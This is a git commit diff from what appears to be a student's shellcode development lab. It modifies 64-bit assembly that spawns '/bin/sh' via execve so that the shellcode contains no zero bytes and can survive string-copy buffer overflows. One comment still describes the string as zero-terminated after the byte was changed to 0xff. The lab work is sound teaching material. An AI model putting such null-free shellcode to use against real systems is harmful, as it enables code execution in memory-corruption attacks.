cac80f6985d1b96146604d6e9612711e9f09a662
AKXUT <23819927@qq.com>
2026-06-04 06:38:29 -0400

    zeros inside shellcode removed

--- software/8. Labsetup-Shellcode Development Lab/mysh64.s
+++ software/8. Labsetup-Shellcode Development Lab/mysh64.s
@@ -3,20 +3,22 @@ section .text
     _start:
 	BITS 64
 	jmp short two
-    one:
+one:
  	pop rbx           
 
  	mov [rbx+8],  rbx  ; store rbx to memory at address rbx + 8
-	mov rax, 0x00      ; rax = 0
+	xor rax, rax       ; rax = 0
  	mov [rbx+16], rax  ; store rax to memory at address rbx + 16
 
-        mov rdi, rbx       ; rdi = rbx
+    mov rdi, rbx       ; rdi = rbx
  	lea rsi, [rbx+8]   ; rsi = rbx + 8    
-        mov rdx, 0x00      ; rdx = 0
+    xor rdx, rdx   ; rdx = 0
+    xor al, al
+    mov [rbx+7], al;
  	mov rax, 59        ; rax = 59
  	syscall
-     two:
-        call one                                                                   
-        db '/bin/sh', 0x00 ; The command string (terminated by a zero)
-        db 'AAAAAAAA'      ; Place holder for argv[0] 
-        db 'BBBBBBBB'      ; Place holder for argv[1]
+two:
+    call one                                                                   
+    db '/bin/sh', 0xff ; The command string (terminated by a zero)
+    db 'AAAAAAAA'      ; Place holder for argv[0] 
+    db 'BBBBBBBB'      ; Place holder for argv[1]
